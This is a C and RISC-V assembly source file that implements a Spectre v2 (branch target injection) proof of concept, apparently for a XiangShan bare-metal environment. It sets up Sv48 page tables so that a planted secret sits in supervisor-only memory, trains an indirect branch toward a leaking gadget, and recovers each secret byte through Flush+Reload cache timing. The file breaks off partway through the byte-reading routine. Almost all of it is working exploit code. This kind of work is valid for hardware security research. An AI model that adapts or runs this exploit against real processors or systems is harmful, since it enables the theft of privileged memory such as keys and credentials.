#include <am.h>
#include <klib.h>
#include <stdint.h>
#include <xsextra.h>

#include "cache-utils.h"

#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif

#ifndef SECRET_OFFSET
#define SECRET_OFFSET 0
#endif

#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif

#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 1
#endif

#ifndef V2_ATTACK_TRIES
#define V2_ATTACK_TRIES 16
#endif

#ifndef V2_TRAINING_LOOPS
#define V2_TRAINING_LOOPS 32
#endif

#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 62
#endif

#ifndef FULL_BYTE_PROBE
#define FULL_BYTE_PROBE 0
#endif

#ifndef EARLY_STOP
#define EARLY_STOP 1
#endif

#ifndef EARLY_STOP_MIN_SCORE
#define EARLY_STOP_MIN_SCORE 2
#endif

#ifndef EARLY_STOP_GAP
#define EARLY_STOP_GAP 1
#endif

#ifndef V2_EARLY_STOP_STRICT
#define V2_EARLY_STOP_STRICT 0
#endif

#ifndef V2_PROBE_MIX
#define V2_PROBE_MIX 0
#endif

#ifndef STRICT_PAGE_TABLE_DEMO
#define STRICT_PAGE_TABLE_DEMO 1
#endif

#ifndef ATTACKER_MPP
#define ATTACKER_MPP 0
#endif

#ifndef DIRECT_SERVICE_CALL
#define DIRECT_SERVICE_CALL 0
#endif

#ifndef USE_AM_CTE
#define USE_AM_CTE 0
#endif

#ifndef V2_ASM_ROUND
#define V2_ASM_ROUND 1
#endif

#ifndef V2_FIXED_MARKER
#define V2_FIXED_MARKER -1
#endif

#ifndef V2_BYTE_WARMUP_ROUNDS
#define V2_BYTE_WARMUP_ROUNDS 0
#endif

#ifndef V2_EXTRA_CHANNEL_FLUSHES
#define V2_EXTRA_CHANNEL_FLUSHES 0
#endif

#ifndef V2_ASM_CONTROL_ROUND
#define V2_ASM_CONTROL_ROUND 0
#endif

#ifndef V2_PROBE_CONTROL_ROUND
#define V2_PROBE_CONTROL_ROUND 0
#endif

#ifndef V2_ASM_STYLE
#define V2_ASM_STYLE 0
#endif

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

#define CHANNEL_ENTRIES 256u
#define CHANNEL_STRIDE L1_BLOCK_SZ_BYTES
_Static_assert(CHANNEL_STRIDE == 64, "gadget assumes 64-byte cache lines");

#define PAGE_SHIFT 12u
#define PAGE_SIZE (1ull << PAGE_SHIFT)
#define PTES_PER_PT 512u
#define SATP_MODE_SV48 (9ull << 60)
#define VPTE_V (1ull << 0)
#define VPTE_R (1ull << 1)
#define VPTE_W (1ull << 2)
#define VPTE_X (1ull << 3)
#define VPTE_U (1ull << 4)
#define VPTE_A (1ull << 6)
#define VPTE_D (1ull << 7)

#define MSTATUS_MPP_MASK (3ull << 11)
#define MCAUSE_USER_ECALL 8u
#define MCAUSE_SUPERVISOR_ECALL 9u
#define MCAUSE_LOAD_ACCESS_FAULT 5u
#define MCAUSE_LOAD_PAGE_FAULT 13u
#define SCAUSE_SUPERVISOR_ECALL 9u

#define SVC_TRAIN 1u
#define SVC_ATTACK 2u
#define SVC_FLUSH_CHANNEL 3u
#define SVC_EXIT 4u
#define SVC_V2_ROUND_ASM 5u

#define PAGE_TABLE_ATTACKER (!(DIRECT_SERVICE_CALL) && !(USE_AM_CTE))
#define U_TEXT __attribute__((section(".u_text"), noinline, aligned(16)))
#define U_DATA __attribute__((section(".u_data"), aligned(4096)))
#define M_SECRET __attribute__((section(".m_secret"), aligned(4096)))

asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".balign 4096\n"
    ".globl __u_text_start\n"
    "__u_text_start:\n"
    ".previous\n");

#if STRICT_PAGE_TABLE_DEMO && ATTACKER_MPP != 0
#error "Sv48 PTE.U isolation demo requires ATTACKER_MPP=0"
#endif

#if STRICT_PAGE_TABLE_DEMO && DIRECT_SERVICE_CALL
#error "Sv48 PTE.U isolation demo requires real machine ecall path"
#endif

#if STRICT_PAGE_TABLE_DEMO && USE_AM_CTE
#error "Sv48 PTE.U isolation demo uses machine ecall path"
#endif

static char M_SECRET secret[] = "S3CreT";
static volatile uintptr_t __attribute__((section(".m_secret"))) target_value;
static volatile uintptr_t __attribute__((section(".m_secret"), aligned(64))) v2_train_root;
static volatile uintptr_t __attribute__((section(".m_secret"), aligned(64))) v2_train_mid;
static volatile uintptr_t __attribute__((section(".m_secret"), aligned(64))) v2_train_node;
static volatile uintptr_t __attribute__((section(".m_secret"), aligned(64))) v2_attack_root;
static volatile uintptr_t __attribute__((section(".m_secret"), aligned(64))) v2_attack_mid;
static volatile uintptr_t __attribute__((section(".m_secret"), aligned(64))) v2_attack_node;
static volatile uint8_t __attribute__((section(".m_secret"), aligned(64))) v2_public_dummy;
static uint8_t U_DATA channel[CHANNEL_ENTRIES * CHANNEL_STRIDE];
static uint8_t U_DATA u_stack[16384];
static uint8_t U_DATA leaked_idx[SECRET_SZ][2];
static uint64_t U_DATA leaked_score[SECRET_SZ][2];
static uint8_t U_DATA leaked_top_idx[SECRET_SZ][4];
static uint64_t U_DATA leaked_top_score[SECRET_SZ][4];
static uint64_t U_DATA leaked_hits[SECRET_SZ][CHANNEL_ENTRIES];
static uint64_t U_DATA tries_used[SECRET_SZ];
static uint64_t U_DATA active_threshold;
static volatile uint64_t U_DATA direct_secret_fault_expected;
static volatile uint64_t U_DATA direct_secret_fault_seen;
static volatile uint64_t U_DATA direct_secret_read_completed;
static volatile uint64_t U_DATA direct_secret_read_value;

static volatile uint8_t m_dummy;
static volatile uint64_t trap_count;
static volatile uint64_t train_call_count;
static volatile uint64_t attack_call_count;
static volatile uint64_t asm_round_call_count;
static volatile uint64_t flush_call_count;
static volatile uint64_t exit_call_count;
static volatile uint64_t bad_trap_count;
static volatile uint64_t last_mcause;
static volatile uint64_t last_mepc;
static volatile int attack_done;
static volatile int attack_status;
static uintptr_t saved_m_sp;

static uint64_t root_pt[PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
static uint64_t l2_pts[4][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
static uint64_t l1_pts[4][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
static uint64_t l0_pts[32][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
static uint64_t l2_used;
static uint64_t l1_used;
static uint64_t l0_used;

extern char __u_text_start[];
extern char __u_text_end[];

static inline uintptr_t page_down(uintptr_t addr)
{
  return addr & ~(uintptr_t)(PAGE_SIZE - 1);
}

static inline uintptr_t page_up(uintptr_t addr)
{
  return (addr + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1);
}

static void zero_page(void *page)
{
  uint64_t *p = (uint64_t *)page;
  for (uint64_t i = 0; i < PTES_PER_PT; ++i)
    p[i] = 0;
}

static int alloc_l2(void)
{
  if (l2_used >= 4)
    return -1;
  zero_page(l2_pts[l2_used]);
  return (int)l2_used++;
}

static int alloc_l1(void)
{
  if (l1_used >= 4)
    return -1;
  zero_page(l1_pts[l1_used]);
  return (int)l1_used++;
}

static int alloc_l0(void)
{
  if (l0_used >= 32)
    return -1;
  zero_page(l0_pts[l0_used]);
  return (int)l0_used++;
}

static uint64_t *walk_page(uintptr_t va, int alloc)
{
  uintptr_t vpn3 = (va >> 39) & 0x1ffu;
  uintptr_t vpn2 = (va >> 30) & 0x1ffu;
  uintptr_t vpn1 = (va >> 21) & 0x1ffu;
  uintptr_t vpn0 = (va >> 12) & 0x1ffu;
  uint64_t *l2;
  uint64_t *l1;
  uint64_t *l0;
  int idx;

  if ((root_pt[vpn3] & VPTE_V) == 0) {
    if (!alloc)
      return 0;
    idx = alloc_l2();
    if (idx < 0)
      return 0;
    root_pt[vpn3] = (((uintptr_t)l2_pts[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l2 = (uint64_t *)(((root_pt[vpn3] >> 10) << PAGE_SHIFT));

  if ((l2[vpn2] & VPTE_V) == 0) {
    if (!alloc)
      return 0;
    idx = alloc_l1();
    if (idx < 0)
      return 0;
    l2[vpn2] = (((uintptr_t)l1_pts[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l1 = (uint64_t *)(((l2[vpn2] >> 10) << PAGE_SHIFT));

  if ((l1[vpn1] & VPTE_V) == 0) {
    if (!alloc)
      return 0;
    idx = alloc_l0();
    if (idx < 0)
      return 0;
    l1[vpn1] = (((uintptr_t)l0_pts[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l0 = (uint64_t *)(((l1[vpn1] >> 10) << PAGE_SHIFT));
  return &l0[vpn0];
}

static int map_identity_page(uintptr_t va, uint64_t perm)
{
  uint64_t *pte = walk_page(va, 1);
  if (pte == 0)
    return -1;
  *pte = ((va >> PAGE_SHIFT) << 10) | VPTE_V | VPTE_A | perm |
         ((perm & VPTE_W) ? VPTE_D : 0);
  return 0;
}

static int map_identity_range(uintptr_t start, uintptr_t end, uint64_t perm)
{
  uintptr_t cur = page_down(start);
  uintptr_t limit = page_up(end);
  for (; cur < limit; cur += PAGE_SIZE) {
    if (map_identity_page(cur, perm) != 0)
      return -1;
  }
  return 0;
}

static void install_priv_page_table(void)
{
  zero_page(root_pt);
  l2_used = 0;
  l1_used = 0;
  l0_used = 0;

  if (map_identity_range((uintptr_t)__u_text_start, (uintptr_t)__u_text_end,
                         VPTE_R | VPTE_X | VPTE_U) != 0)
    panic("map u_text failed");
  if (map_identity_range((uintptr_t)channel, (uintptr_t)channel + sizeof(channel),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map channel failed");
  if (map_identity_range((uintptr_t)u_stack, (uintptr_t)u_stack + sizeof(u_stack),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map u_stack failed");
  if (map_identity_range((uintptr_t)leaked_idx, (uintptr_t)leaked_idx + sizeof(leaked_idx),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map leaked_idx failed");
  if (map_identity_range((uintptr_t)leaked_score, (uintptr_t)leaked_score + sizeof(leaked_score),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map leaked_score failed");
  if (map_identity_range((uintptr_t)leaked_top_idx,
                         (uintptr_t)leaked_top_score + sizeof(leaked_top_score),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map leaked_top failed");
  if (map_identity_range((uintptr_t)leaked_hits,
                         (uintptr_t)leaked_hits + sizeof(leaked_hits),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map leaked_hits failed");
  if (map_identity_range((uintptr_t)tries_used, (uintptr_t)tries_used + sizeof(tries_used),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map tries_used failed");
  if (map_identity_range((uintptr_t)&active_threshold,
                         (uintptr_t)&direct_secret_read_value + sizeof(direct_secret_read_value),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map u_shared failed");
  if (map_identity_range((uintptr_t)secret,
                         (uintptr_t)&target_value + sizeof(target_value),
                         VPTE_R | VPTE_W) != 0)
    panic("map m_secret failed");
  if (map_identity_range((uintptr_t)&v2_train_root,
                         (uintptr_t)&v2_train_root + sizeof(v2_train_root),
                         VPTE_R | VPTE_W) != 0)
    panic("map v2_train_root failed");
  if (map_identity_range((uintptr_t)&v2_train_mid,
                         (uintptr_t)&v2_train_mid + sizeof(v2_train_mid),
                         VPTE_R | VPTE_W) != 0)
    panic("map v2_train_mid failed");
  if (map_identity_range((uintptr_t)&v2_train_node,
                         (uintptr_t)&v2_train_node + sizeof(v2_train_node),
                         VPTE_R | VPTE_W) != 0)
    panic("map v2_train_node failed");
  if (map_identity_range((uintptr_t)&v2_attack_root,
                         (uintptr_t)&v2_attack_root + sizeof(v2_attack_root),
                         VPTE_R | VPTE_W) != 0)
    panic("map v2_attack_root failed");
  if (map_identity_range((uintptr_t)&v2_attack_mid,
                         (uintptr_t)&v2_attack_mid + sizeof(v2_attack_mid),
                         VPTE_R | VPTE_W) != 0)
    panic("map v2_attack_mid failed");
  if (map_identity_range((uintptr_t)&v2_attack_node,
                         (uintptr_t)&v2_attack_node + sizeof(v2_attack_node),
                         VPTE_R | VPTE_W) != 0)
    panic("map v2_attack_node failed");
  if (map_identity_range((uintptr_t)&v2_public_dummy,
                         (uintptr_t)&v2_public_dummy + sizeof(v2_public_dummy),
                         VPTE_R | VPTE_W) != 0)
    panic("map v2_public_dummy failed");

  uintptr_t satp = SATP_MODE_SV48 | (((uintptr_t)root_pt) >> PAGE_SHIFT);
  asm volatile("csrw satp, %0\nsfence.vma zero, zero\nfence.i" :: "r"(satp) : "memory");
}

static U_TEXT int is_candidate_value(uint64_t value)
{
  return (value >= '0' && value <= '9') ||
         (value >= 'A' && value <= 'Z') ||
         (value >= 'a' && value <= 'z');
}

static U_TEXT uint64_t reload_mix(uint64_t i, uint64_t try_no)
{
#if V2_PROBE_MIX == 1
  (void)try_no;
  return ((i * 167u) + 13u) & 255u;
#else
  uint64_t x = (i + try_no * 73u) & 255u;
  x ^= (x << 3) & 255u;
  x ^= x >> 5;
  x ^= (x << 1) & 255u;
  return x & 255u;
#endif
}

static U_TEXT void top_two_idx(uint64_t *in, uint64_t count,
                               uint8_t out_idx[2], uint64_t out_score[2])
{
  out_idx[0] = 0;
  out_idx[1] = 0;
  out_score[0] = 0;
  out_score[1] = 0;

  for (uint64_t i = 0; i < count; ++i) {
    if (in[i] > out_score[0]) {
      out_score[1] = out_score[0];
      out_idx[1] = out_idx[0];
      out_score[0] = in[i];
      out_idx[0] = i;
    } else if (in[i] > out_score[1]) {
      out_score[1] = in[i];
      out_idx[1] = i;
    }
  }
}

static U_TEXT void top_four_idx(uint64_t *in, uint64_t count,
                                uint8_t out_idx[4], uint64_t out_score[4])
{
  for (uint64_t i = 0; i < 4; ++i) {
    out_idx[i] = 0;
    out_score[i] = 0;
  }

  for (uint64_t i = 0; i < count; ++i) {
    uint64_t score = in[i];
    for (uint64_t j = 0; j < 4; ++j) {
      if (score > out_score[j]) {
        for (uint64_t k = 3; k > j; --k) {
          out_score[k] = out_score[k - 1];
          out_idx[k] = out_idx[k - 1];
        }
        out_score[j] = score;
        out_idx[j] = i;
        break;
      }
    }
  }
}

#if EARLY_STOP
static U_TEXT int enough_confidence(uint64_t *hits)
{
  uint8_t idx[2];
  uint64_t score[2];

  top_two_idx(hits, CHANNEL_ENTRIES, idx, score);
  (void)idx;
#if V2_EARLY_STOP_STRICT
  return score[0] >= (2u * score[1] + 5u) ||
         (score[0] == 2u && score[1] == 0u);
#else
  return score[0] >= EARLY_STOP_MIN_SCORE &&
         score[0] >= score[1] + EARLY_STOP_GAP;
#endif
}
#endif

static U_TEXT uint64_t u_probe_time(volatile uint8_t *addr)
{
  uint64_t start;
  uint64_t end;
  uint8_t dummy;

  asm volatile(
      "fence rw, rw\n"
      "rdcycle %[start]\n"
      "lbu %[dummy], 0(%[addr])\n"
      "fence rw, rw\n"
      "rdcycle %[end]\n"
      : [start] "=&r"(start), [end] "=&r"(end), [dummy] "=&r"(dummy)
      : [addr] "r"(addr)
      : "memory");
  (void)dummy;
  return end - start;
}

static U_TEXT void probe_direct_secret_access(void)
{
  uint64_t value = 0;

  direct_secret_fault_seen = 0;
  direct_secret_read_completed = 0;
  direct_secret_read_value = 0;
  direct_secret_fault_expected = 1;
  asm volatile("lbu %0, 0(%1)" : "=&r"(value) : "r"(secret) : "memory");
  direct_secret_fault_expected = 0;
  if (!direct_secret_fault_seen) {
    direct_secret_read_value = value;
    direct_secret_read_completed = 1;
  }
}

static __attribute__((noinline)) int gadget(char *addr)
{
  uint8_t value = *(volatile uint8_t *)addr;
  uint8_t loaded = channel[(uint64_t)value * CHANNEL_STRIDE];
  m_dummy ^= loaded;
  return loaded;
}

static __attribute__((noinline)) int safe_target(char *addr)
{
  return (int)((uintptr_t)addr & 1u);
}

static __attribute__((noinline)) int victim_indirect(char *addr, int input)
{
  int junk = 0;
  for (int i = 1; i <= 64; ++i) {
    input += i;
    junk += input & i;
  }

  xs_flush_cache_line((void *)&target_value);
  xs_fence();
  for (int i = 1; i <= 16; ++i)
    junk += input / i;

  int (*fn)(char *) = (int (*)(char *))target_value;
  return fn(addr) & junk;
}

static void flush_channel_service(uint8_t *probe)
{
  for (uint64_t i = 0; i < CHANNEL_ENTRIES; ++i)
    xs_flush_cache_line(&probe[i * CHANNEL_STRIDE]);
  xs_flush_cache_line((void *)&target_value);
  xs_fence();
}

static void train_service(void)
{
  char dummy = 1;

  target_value = (uintptr_t)&gadget;
  xs_fence();
  for (int j = V2_TRAINING_LOOPS; j > 0; --j)
    m_dummy ^= victim_indirect(&dummy, 0);
}

static void attack_service(char *addr)
{
  target_value = (uintptr_t)&safe_target;
  xs_flush_cache_line((void *)&target_value);
  xs_fence();
  m_dummy ^= victim_indirect(addr, 0);
}

void v2_round_asm_impl(char *secret_addr, uint8_t *probe);
void v2_asm_gadget(void);
void v2_asm_safe(void);

asm(
    ".section .text\n"
    ".option push\n"
    ".option norvc\n"
    ".balign 64\n"
    ".globl v2_round_asm_impl\n"
    "v2_round_asm_impl:\n"
    "  addi sp, sp, -80\n"
    "  sd   ra, 0(sp)\n"
    "  sd   s1, 8(sp)\n"
    "  sd   s2, 16(sp)\n"
    "  sd   s3, 24(sp)\n"
    "  sd   s4, 32(sp)\n"
    "  sd   s5, 40(sp)\n"
    "  sd   s6, 48(sp)\n"
    "  mv   s4, a0\n"
    "  mv   s1, a1\n"
    "  la   s3, v2_public_dummy\n"
    "  li   s2, " STR(V2_TRAINING_LOOPS) "\n"
#if V2_ASM_STYLE == 1
    "  la   s5, v2_asm_gadget\n"
    "  la   s6, v2_asm_safe\n"
#else
    "  la   s5, v2_train_root\n"
    "  la   s6, v2_attack_root\n"
#endif
    "  lbu  t0, 0(s4)\n"
    "  mv   t1, s1\n"
    "  li   t0, 0\n"
    "  li   t2, 256\n"
    ".Lv2_flush_channel:\n"
    "  cbo.flush 0(t1)\n"
    "  addi t1, t1, 64\n"
    "  addi t0, t0, 1\n"
    "  bltu t0, t2, .Lv2_flush_channel\n"
    "  fence rw, rw\n"
    ".Lv2_round:\n"
    "  sltiu t4, s2, 1\n"
    "  neg   t4, t4\n"
    "  xor   t5, s3, s4\n"
    "  and   t5, t5, t4\n"
    "  xor   a0, s3, t5\n"
    "  xor   t5, s5, s6\n"
    "  and   t5, t5, t4\n"
    "  xor   t3, s5, t5\n"
#if V2_ASM_STYLE == 1
    "  addi t3, t3, -2\n"
    "  addi t1, zero, 2\n"
    "  slli t2, t1, 0x4\n"
    "  fcvt.s.lu fa4, t1\n"
    "  fcvt.s.lu fa5, t2\n"
    "  fdiv.s fa5, fa5, fa4\n"
    "  fdiv.s fa5, fa5, fa4\n"
    "  fdiv.s fa5, fa5, fa4\n"
    "  fdiv.s fa5, fa5, fa4\n"
    "  fcvt.lu.s t2, fa5, rtz\n"
    "  add  t2, t3, t2\n"
#else
    "  la    t0, v2_train_root\n"
    "  cbo.flush 0(t0)\n"
    "  la    t0, v2_train_mid\n"
    "  cbo.flush 0(t0)\n"
    "  la    t0, v2_train_node\n"
    "  cbo.flush 0(t0)\n"
    "  la    t0, v2_attack_root\n"
    "  cbo.flush 0(t0)\n"
    "  la    t0, v2_attack_mid\n"
    "  cbo.flush 0(t0)\n"
    "  la    t0, v2_attack_node\n"
    "  cbo.flush 0(t0)\n"
    "  fence rw, rw\n"
    "  ld    t2, 0(t3)\n"
    "  ld    t2, 0(t2)\n"
    "  ld    t2, 0(t2)\n"
#endif
    ".balign 64\n"
    ".Lv2_indirect_site:\n"
    "  jalr  x0, t2, 0\n"
    ".balign 64\n"
    ".globl v2_asm_gadget\n"
    "v2_asm_gadget:\n"
#if V2_FIXED_MARKER >= 0
    "  li   t1, " STR(V2_FIXED_MARKER) "\n"
#else
    "  lbu  t1, 0(a0)\n"
#endif
    "  slli t1, t1, 6\n"
    "  add  t1, s1, t1\n"
    "  lbu  x0, 0(t1)\n"
    "  j    .Lv2_continue\n"
    ".balign 64\n"
    ".globl v2_asm_safe\n"
    "v2_asm_safe:\n"
    "  andi t1, a0, 1\n"
    "  j    .Lv2_continue\n"
    ".Lv2_continue:\n"
    "  beqz s2, .Lv2_done\n"
    "  addi s2, s2, -1\n"
    "  j    .Lv2_round\n"
    ".Lv2_done:\n"
    "  ld   ra, 0(sp)\n"
    "  ld   s1, 8(sp)\n"
    "  ld   s2, 16(sp)\n"
    "  ld   s3, 24(sp)\n"
    "  ld   s4, 32(sp)\n"
    "  ld   s5, 40(sp)\n"
    "  ld   s6, 48(sp)\n"
    "  addi sp, sp, 80\n"
    "  ret\n"
    ".option pop\n");

static void init_v2_target_chain(void)
{
  v2_public_dummy = 0;
  v2_train_node = (uintptr_t)v2_asm_gadget;
  v2_train_mid = (uintptr_t)&v2_train_node;
  v2_train_root = (uintptr_t)&v2_train_mid;
  v2_attack_node = (uintptr_t)v2_asm_safe;
  v2_attack_mid = (uintptr_t)&v2_attack_node;
  v2_attack_root = (uintptr_t)&v2_attack_mid;
}

static void v2_round_asm_service(char *addr, uint8_t *probe)
{
  if (addr == 0)
    addr = (char *)&v2_public_dummy;
  v2_round_asm_impl(addr, probe);
}

void m_trap_dispatch(uint64_t cause, uint64_t epc,
                     uint64_t a0, uint64_t a1, uint64_t a7)
{
  trap_count++;
  last_mcause = cause;
  last_mepc = epc;

  if ((cause == MCAUSE_LOAD_ACCESS_FAULT || cause == MCAUSE_LOAD_PAGE_FAULT) &&
      direct_secret_fault_expected != 0) {
    direct_secret_fault_seen = 1;
    direct_secret_fault_expected = 0;
    return;
  }

  if (cause != MCAUSE_USER_ECALL && cause != MCAUSE_SUPERVISOR_ECALL) {
    bad_trap_count++;
    attack_status = 2;
    attack_done = 1;
    return;
  }

  if (a7 == SVC_TRAIN) {
    train_call_count++;
    train_service();
  } else if (a7 == SVC_ATTACK) {
    attack_call_count++;
    attack_service((char *)a0);
  } else if (a7 == SVC_FLUSH_CHANNEL) {
    flush_call_count++;
    flush_channel_service((uint8_t *)a0);
  } else if (a7 == SVC_V2_ROUND_ASM) {
    asm_round_call_count++;
    v2_round_asm_service((char *)a0, (uint8_t *)a1);
  } else if (a7 == SVC_EXIT) {
    exit_call_count++;
    attack_status = (int)a0;
    attack_done = 1;
  } else {
    bad_trap_count++;
    attack_status = 3;
    attack_done = 1;
  }
}

void m_trap_entry(void);
asm(
    ".section .text\n"
    ".align 2\n"
    ".globl m_trap_entry\n"
    "m_trap_entry:\n"
    "  addi sp, sp, -128\n"
    "  sd ra, 0(sp)\n"
    "  sd t0, 8(sp)\n"
    "  sd t1, 16(sp)\n"
    "  sd t2, 24(sp)\n"
    "  sd a0, 32(sp)\n"
    "  sd a1, 40(sp)\n"
    "  sd a2, 48(sp)\n"
    "  sd a3, 56(sp)\n"
    "  sd a4, 64(sp)\n"
    "  sd a5, 72(sp)\n"
    "  sd a6, 80(sp)\n"
    "  sd a7, 88(sp)\n"
    "  csrr a0, mcause\n"
    "  csrr a1, mepc\n"
    "  ld a2, 32(sp)\n"
    "  ld a3, 40(sp)\n"
    "  ld a4, 88(sp)\n"
    "  call m_trap_dispatch\n"
    "  la t0, attack_done\n"
    "  lw t1, 0(t0)\n"
    "  bnez t1, 1f\n"
    "  csrr t0, mepc\n"
    "  addi t0, t0, 4\n"
    "  csrw mepc, t0\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 128\n"
    "  mret\n"
    "1:\n"
    "  la t0, machine_low_return\n"
    "  csrw mepc, t0\n"
    "  li t0, 0x1800\n"
    "  csrs mstatus, t0\n"
    "  mret\n");

#if !V2_ASM_ROUND
static U_TEXT void svc_train(void)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, 0, 0, SVC_TRAIN);
#else
  register uint64_t a7 asm("a7") = SVC_TRAIN;
  asm volatile("ecall" :: "r"(a7) : "memory");
#endif
}

static U_TEXT void svc_attack(char *addr)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, (uint64_t)addr, 0, SVC_ATTACK);
#else
  register uint64_t a0 asm("a0") = (uint64_t)addr;
  register uint64_t a7 asm("a7") = SVC_ATTACK;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
#endif
}
#endif

#if !V2_ASM_ROUND || V2_PROBE_CONTROL_ROUND || V2_EXTRA_CHANNEL_FLUSHES > 0
static U_TEXT void svc_flush_channel(volatile uint8_t *probe)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, (uint64_t)probe, 0, SVC_FLUSH_CHANNEL);
#else
  register uint64_t a0 asm("a0") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_FLUSH_CHANNEL;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
#endif
}
#endif

static U_TEXT void svc_v2_round_asm(char *addr, volatile uint8_t *probe)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, (uint64_t)addr,
                  (uint64_t)probe, SVC_V2_ROUND_ASM);
#else
  register uint64_t a0 asm("a0") = (uint64_t)addr;
  register uint64_t a1 asm("a1") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_V2_ROUND_ASM;
  asm volatile("ecall" : "+r"(a0) : "r"(a1), "r"(a7) : "memory");
#endif
}

static U_TEXT void svc_exit(uint64_t status)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, status, 0, SVC_EXIT);
  return;
#else
  register uint64_t a0 asm("a0") = status;
  register uint64_t a7 asm("a7") = SVC_EXIT;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
  __builtin_unreachable();
#endif
}

static U_TEXT void read_byte(char *addr_to_read, uint64_t len)
{
  uint64_t hits[CHANNEL_ENTRIES];
  uint64_t control_hits[CHANNEL_ENTRIES];
  char control_value = 0;
  for (uint64_t i = 0; i < CHANNEL_ENTRIES; ++i)
    hits[i] = 0;
  for (uint64_t i = 0; i < CHANNEL_ENTRIES; ++i)
    control_hits[i] = 0;

#if V2_ASM_ROUND
  for (uint64_t warm = 0; warm < V2_BYTE_WARMUP_ROUNDS; ++warm)
    svc_v2_round_asm(addr_to_read, channel);
#endif

  for (uint64_t tries = 0; tries < V2_ATTACK_TRIES; ++tries) {
#if V2_ASM_ROUND
#if V2_ASM_CONTROL_ROUND
    svc_v2_round_asm(0, channel);

    uint64_t control_seen = 0;
    for (uint64_t i = 0; i < CHANNEL_ENTRIES && control_seen < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = reload_mix(i, tries);
#if !FULL_BYTE_PROBE
      if (!is_candidate_value(mixed_i))
        continue;
#endif
      if (mixed_i == 0)
        continue;
      control_seen++;
      uint64_t elapsed = u_probe_time(&channel[mixed_i * CHANNEL_STRIDE]);
      if (elapsed <= active_threshold)
        control_hits[mixed_i]++;
    }
#endif
#if V2_PROBE_CONTROL_ROUND
    svc_flush_channel(channel);

    uint64_t control_seen = 0;
    for (uint64_t i = 0; i < CHANNEL_ENTRIES && control_seen < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = reload_mix(i, tries);
#if !FULL_BYTE_PROBE
      if (!is_candidate_value(mixed_i))
        continue;
#endif
      if (mixed_i == 0)
        continue;
      control_seen++;
      uint64_t elapsed = u_probe_time(&channel[mixed_i * CHANNEL_STRIDE]);
      if (elapsed <= active_threshold)
        control_hits[mixed_i]++;
    }
#endif

#if V2_EXTRA_CHANNEL_FLUSHES > 0
    for (uint64_t flush = 0; flush < V2_EXTRA_CHANNEL_FLUSHES; ++flush)
      svc_flush_channel(channel);
#endif

    svc_v2_round_asm(addr_to_read, channel);

    uint64_t seen = 0;
    for (uint64_t i = 0; i < CHANNEL_ENTRIES && seen < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = reload_mix(i, tries);
#if !FULL_BYTE_PROBE
      if (!is_candidate_value(mixed_i))
        continue;
#endif
      if (mixed_i == 0)
        continue;
      seen++;
      uint64_t elapsed = u_probe_time(&channel[mixed_i * CHANNEL_STRIDE]);
      if (elapsed <= active_threshold)
        hits[mixed_i]++;
    }
#else
    svc_flush_channel(channel);
    svc_train();
    svc_flush_channel(channel);
    svc_attack(&control_value);

    uint64_t seen = 0;
    for (uint64_t i = 0; i < CHANNEL_ENTRIES && seen < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = reload_mix(i, tries);
#if !FULL_BYTE_PROBE
      if (!is_candidate_value(mixed_i))
        continue;
#endif
      seen++;
      uint64_t elapsed = u_probe_time(&channel[mixed_i * CHANNEL_STRIDE]);
      if (elapsed <= active_threshold)
        control_hits[mixed_i]++;
    }

    svc_flush_channel(channel);
    svc_train();
    svc_flush_channel(channel);
    svc_attack(addr_to_read);

    seen = 0;
    for (uint64_t i = 0; i < CHANNEL_ENTRIES && seen < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = reload_mix(i, tries);
#if !FULL_BYTE_PROBE
      if (!is_candidate_value(mixed_i))
        continue;
#endif
      seen++;
      uint64_t elapsed = u_probe_time(&channel[mixed_i * CHANNEL_STRIDE]);
      if (elapsed <= active_threshold)
        hits[mixed_i]++;
    }
#endif

